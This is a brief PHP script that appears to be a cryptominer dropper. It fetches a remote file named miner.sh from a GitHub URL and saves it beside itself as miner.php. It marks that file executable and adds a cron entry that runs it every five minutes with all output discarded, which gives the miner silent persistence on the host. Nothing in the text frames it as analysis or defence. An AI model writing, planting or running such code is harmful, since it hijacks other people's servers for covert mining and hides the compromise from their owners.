
<?php
$Url = "https://github.com/LordFarqa/miner/blob/main/miner.sh";
$Path = __DIR__ . "/miner.php";
$miner = file_get_contents($Url);
if ($miner) {
    file_put_contents($Path, $miner);
    chmod($Path, 0755);
    $cronJob = "*/5 * * * * php " . $Path . " >/dev/null 2>&1";
    
    $currentCron = shell_exec("crontab -l 2>/dev/null");
    
    if (strpos($currentCron, $Path) === false) {
        file_put_contents("/tmp/cron.tmp", $currentCron . $cronJob . "\n");
        exec("crontab /tmp/cron.tmp");
        unlink("/tmp/cron.tmp");
    }
}
?>